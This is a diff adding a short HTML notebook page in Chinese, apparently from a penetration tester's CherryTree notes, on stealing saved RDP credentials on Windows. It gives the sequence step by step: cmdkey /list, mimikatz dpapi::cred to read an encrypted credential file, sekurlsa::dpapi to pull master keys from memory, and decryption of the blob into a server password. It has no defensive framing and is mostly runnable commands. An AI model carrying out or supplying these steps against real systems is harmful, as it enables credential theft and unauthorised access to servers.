@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>本地保存远程终端的凭据</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>本地保存远程终端的凭据</h1><br/>查看Windows凭据<br />cmdkey /list<br /><br />凭据存储在用户目录下: C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\*，<br /><br />获取GUID和密码的密文<br />mimikatz &quot;dpapi::cred /in:C:\Users\xx\AppData\Local\Microsoft\Credentials\FF359429D6F19C64BA7D3E282558EEB5&quot;<br /><br />结果中：<br />pbData是凭据的加密数据，<br />guidMasterKey是凭据的GUID: {d91b091a-ef25-4424-aa45-a2a56b47a699}。<br /><br />获取GUID对应的密钥<br />mimikatz privilege::debug sekurlsa::dpapi<br />根据目标凭据GUID: {d91b091a-ef25-4424-aa45-a2a56b47a699}找到其关联的MasterKey，这个MasterKey就是加密凭据的密钥，即解密pbData所必须的东西。<br /><br />拿到了MasterKey,服务器密码便唾手可得。执行解密命令:<br />mimikatz &quot;dpapi::cred /in:C:\Users\xx\AppData\Local\Microsoft\Credentials\FF359429D6F19C64BA7D3E282558EEB5 /masterkey:28d1f3252c019f9cxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx16dcec8e5dbf5cd0&quot;<br /><br />解密出来的CredentialBlob即为凭据TERMSRV/1xx.xxx.xxx.xx2的服务器密码。<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
